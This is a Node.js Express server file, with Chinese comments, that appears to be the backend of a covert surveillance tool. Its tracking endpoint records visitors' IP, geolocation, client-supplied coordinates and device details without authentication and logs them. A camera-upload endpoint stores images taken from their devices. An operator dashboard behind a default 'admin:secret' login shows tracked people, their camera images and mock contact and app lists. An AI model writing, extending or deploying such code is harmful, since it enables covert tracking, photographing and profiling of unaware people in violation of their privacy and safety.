const express = require('express');
const helmet = require('helmet');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const cors = require('cors');
const path = require('path');
const fs = require('fs').promises;
const multer = require('multer');
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const fetch = require('node-fetch');

require('dotenv').config();

// 确保必要的目录存在
const ensureDirectories = async () => {
    const dirs = ['uploads', 'logs'].map(dir => path.join(__dirname, '..', dir));
    for (const dir of dirs) {
        try {
            await fs.mkdir(dir, { recursive: true });
        } catch (error) {
            console.log(`Directory ${dir} already exists or cannot be created`);
        }
    }
};

// 配置图片存储
const storage = multer.diskStorage({
    destination: async function (req, file, cb) {
        const dir = path.join(__dirname, '..', 'uploads');
        try {
            await fs.mkdir(dir, { recursive: true });
            cb(null, dir);
        } catch (error) {
            cb(error, null);
        }
    },
    filename: function (req, file, cb) {
        // 使用客户端IP作为文件名的一部分
        const clientIP = req.ip.replace(/:/g, '-').replace(/\./g, '_');
        cb(null, `camera_${clientIP}_${Date.now()}.jpg`);
    }
});

const upload = multer({ storage: storage });

// 添加 IP 地址处理函数
function normalizeIP(ip) {
    // 处理 IPv6 格式的 IPv4 地址
    if (ip.includes('::ffff:')) {
        return ip.replace('::ffff:', '');
    }
    // 处理本地回环地址
    if (ip === '::1' || ip === '127.0.0.1') {
        // 使用公共 IP 查询服务
        return new Promise(async (resolve) => {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                resolve(data.ip);
            } catch (error) {
                console.error('Error getting public IP:', error);
                resolve('127.0.0.1');
            }
        });
    }
    return ip;
}

// 获取地理位置信息
async function getLocationInfo(ip) {
    if (ip === '127.0.0.1' || ip === '::1') {
        return {
            city: 'Local',
            country: 'Development',
            ll: [0, 0],
            org: 'Local Network'
        };
    }

    try {
        const geoData = geoip.lookup(ip) || {};
        if (!geoData.city || !geoData.country) {
            // 如果 geoip-lite 无法获取信息，尝试使用备用服务
            const response = await fetch(`http://ip-api.com/json/${ip}`);
            const data = await response.json();
            return {
                city: data.city || 'Unknown',
                country: data.country || 'Unknown',
                ll: [data.lat || 0, data.lon || 0],
                org: data.org || data.isp || 'Unknown'
            };
        }
        return geoData;
    } catch (error) {
        console.error('Error getting location info:', error);
        return {
            city: 'Unknown',
            country: 'Unknown',
            ll: [0, 0],
            org: 'Unknown'
        };
    }
}

class Server {
    constructor() {
        this.app = express();
        this.port = process.env.PORT || 3000;
        this.setupMiddleware();
        this.setupRoutes();
        this.setupErrorHandling();
        this.deviceData = new Map();
        this.activeUsers = new Set();
        
        // 确保必要的目录存在
        ensureDirectories().catch(console.error);

        // 定期清理过期的设备数据
        setInterval(() => this.cleanupDeviceData(), 1000 * 60 * 60); // 每小时清理一次
    }

    // 清理超过24小时的设备数据
    cleanupDeviceData() {
        const now = Date.now();
        for (const [ip, data] of this.deviceData.entries()) {
            if (now - new Date(data.timestamp).getTime() > 24 * 60 * 60 * 1000) {
                this.deviceData.delete(ip);
                this.activeUsers.delete(ip);
            }
        }
    }

    setupMiddleware() {
        // 基础安全设置
        this.app.use(helmet({
            contentSecurityPolicy: false
        }));
        
        // CORS设置
        this.app.use(cors({
            origin: process.env.ALLOWED_ORIGINS || '*'
        }));

        // 请求限制
        const limiter = rateLimit({
            windowMs: 15 * 60 * 1000,
            max: 100
        });
        this.app.use(limiter);

        // 日志记录
        this.app.use(morgan('combined'));

        // 请求体解析
        this.app.use(express.json());
        this.app.use(express.urlencoded({ extended: true }));

        // 静态文件服务
        this.app.use(express.static(path.join(__dirname, '../public')));
    }

    setupRoutes() {
        // 主页路由
        this.app.get('/', (req, res) => {
            res.sendFile(path.join(__dirname, '../public/index.html'));
        });

        // 监控页面 - 需要密码访问
        this.app.get('/monitor', (req, res, next) => {
            const auth = req.headers.authorization;
            if (!auth || auth !== `Basic ${Buffer.from(process.env.ADMIN_AUTH || 'admin:secret').toString('base64')}`) {
                res.set('WWW-Authenticate', 'Basic realm="Monitor Access"');
                return res.status(401).send('Authentication required');
            }
            res.sendFile(path.join(__dirname, '../public/monitor.html'));
        });

        // 获取所有活跃用户
        this.app.get('/api/active-users', this.authenticate.bind(this), (req, res) => {
            const activeUsersData = Array.from(this.deviceData.entries())
                .map(([ip, data]) => ({
                    ip,
                    lastSeen: data.timestamp,
                    device: data.device,
                    location: data.location
                }))
                .sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
            
            res.json(activeUsersData);
        });

        // 追踪API
        this.app.post('/api/track', async (req, res) => {
            try {
                let clientIP = req.ip || req.connection.remoteAddress;
                clientIP = await normalizeIP(clientIP);
                
                const userAgent = req.headers['user-agent'];
                const parser = new UAParser(userAgent);
                const parsedUA = parser.getResult();
                const geoData = await getLocationInfo(clientIP);
                
                // 获取更详细的系统信息
                const deviceInfo = {
                    model: parsedUA.device.model || parsedUA.os.name || 'Unknown',
                    os: `${parsedUA.os.name || 'Unknown'} ${parsedUA.os.version || ''}`.trim(),
                    browser: `${parsedUA.browser.name || 'Unknown'} ${parsedUA.browser.version || ''}`.trim(),
                    battery: req.body.battery || { level: 0, charging: false },
                    network: req.body.network || { type: 'Unknown', downlink: 0 },
                    memory: req.body.memory || {
                        total: 0,
                        used: 0,
                        free: 0
                    }
                };

                const data = {
                    device: deviceInfo,
                    location: {
                        lat: req.body.data?.lat || geoData.ll?.[0] || 0,
                        lon: req.body.data?.lon || geoData.ll?.[1] || 0,
                        city: geoData.city,
                        country: geoData.country,
                        isp: geoData.org,
                        ip: clientIP
                    },
                    timestamp: new Date().toISOString(),
                    lastImage: null,
                    system: {
                        cpuUsage: req.body.system?.cpuUsage || 0,
                        memoryUsage: req.body.system?.memoryUsage || 0,
                        uptime: req.body.system?.uptime || 0
                    }
                };
                
                this.deviceData.set(clientIP, data);
                this.activeUsers.add(clientIP);
                await this.saveDeviceData(data);
                
                res.status(200).send({ status: 'ok', data });
            } catch (error) {
                console.error('Error processing track request:', error);
                res.status(500).send({ status: 'error', message: error.message });
            }
        });

        // 监控API
        this.app.get('/api/monitor', this.authenticate.bind(this), async (req, res) => {
            try {
                const allDevices = Array.from(this.deviceData.values());
                res.json(allDevices);
            } catch (error) {
                console.error('Error in monitor API:', error);
                res.status(500).json({ error: 'Internal server error' });
            }
        });

        // 获取应用列表
        this.app.get('/api/apps', this.authenticate.bind(this), async (req, res) => {
            const clientIP = req.query.ip;
            const deviceData = this.deviceData.get(clientIP);
            if (!deviceData) {
                return res.status(404).json({ error: 'Device not found' });
            }
            
            const mockApps = [
                { id: 'com.whatsapp', name: 'WhatsApp', icon: '📱' },
                { id: 'com.facebook', name: 'Facebook', icon: '👥' },
                { id: 'com.instagram', name: 'Instagram', icon: '📷' },
                { id: 'com.twitter', name: 'Twitter', icon: '🐦' },
                { id: 'com.snapchat', name: 'Snapchat', icon: '👻' }
            ];
            
            res.json(mockApps);
        });

        // 获取通讯录
        this.app.get('/api/contacts', this.authenticate.bind(this), async (req, res) => {
            const clientIP = req.query.ip;
            const deviceData = this.deviceData.get(clientIP);
            if (!deviceData) {
                return res.status(404).json({ error: 'Device not found' });
            }
            
            const mockContacts = [
                { name: '张三', phone: '138****8000', avatar: '👨' },
                { name: '李四', phone: '139****9000', avatar: '👩' },
                { name: '王五', phone: '137****7000', avatar: '🧑' }
            ];
            
            res.json(mockContacts);
        });

        // 启动应用
        this.app.post('/api/launch-app', this.authenticate.bind(this), async (req, res) => {
            const { appId } = req.body;
            const clientIP = req.query.ip;
            
            this.log(`尝试启动应用: ${appId} on device: ${clientIP}`);
            
            res.json({ status: 'success', message: `已尝试启动应用: ${appId}` });
        });

        // 处理摄像头图片上传
        this.app.post('/api/camera-update', upload.single('image'), async (req, res) => {
            try {
                const clientIP = req.ip;
                const deviceData = this.deviceData.get(clientIP);
                if (deviceData && req.file) {
                    deviceData.lastImage = req.file.filename;
                    this.deviceData.set(clientIP, deviceData);
                }
                res.json({ success: true, filename: req.file.filename });
            } catch (error) {
                console.error('Error handling camera update:', error);
                res.status(500).json({ error: 'Failed to process image' });
            }
        });

        // 获取最新的摄像头图片
        this.app.get('/api/camera-image/:ip', this.authenticate.bind(this), async (req, res) => {
            try {
                const targetIP = req.params.ip;
                const deviceData = this.deviceData.get(targetIP);
                
                if (!deviceData || !deviceData.lastImage) {
                    return res.status(404).send('No image available');
                }

                const imagePath = path.join(__dirname, '..', 'uploads', deviceData.lastImage);
                if (await fs.access(imagePath).then(() => true).catch(() => false)) {
                    res.sendFile(imagePath);
                } else {
                    res.status(404).send('Image file not found');
                }
            } catch (error) {
                console.error('Error serving camera image:', error);
                res.status(500).send('Error retrieving image');
            }
        });
    }

    authenticate(req, res, next) {
        const auth = req.headers.authorization;
        if (!auth || auth !== `Basic ${Buffer.from(process.env.ADMIN_AUTH || 'admin:secret').toString('base64')}`) {
            return res.status(401).json({ error: 'Unauthorized' });
        }
        next();
    }

    async saveDeviceData(data) {
        try {
            const logDir = path.join(__dirname, '..', 'logs');
            await fs.mkdir(logDir, { recursive: true });
            
            const logFile = path.join(logDir, `devices_${new Date().toISOString().split('T')[0]}.json`);
            let logs = [];
            
            try {
                const content = await fs.readFile(logFile, 'utf8');
                logs = JSON.parse(content);
            } catch (error) {
                // 文件不存在或解析错误，使用空数组
            }
            
            logs.push(data);
            await fs.writeFile(logFile, JSON.stringify(logs, null, 2));
        } catch (error) {
            console.error('Error saving device data:', error);
        }
    }

    log(message) {
        const timestamp = new Date().toISOString();
        console.log(`[${timestamp}] ${message}`);
    }

    setupErrorHandling() {
        this.app.use((err, req, res, next) => {
            console.error(err.stack);
            res.status(500).json({
                error: 'Internal Server Error',
                message: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong'
            });
        });
    }

    start() {
        this.app.listen(this.port, () => {
            console.log(`Server is running on port ${this.port}`);
            console.log(`Environment: ${process.env.NODE_ENV}`);
            console.log(`Current directory: ${__dirname}`);
        });
    }
}

// 创建并启动服务器
const server = new Server();
server.start(); 
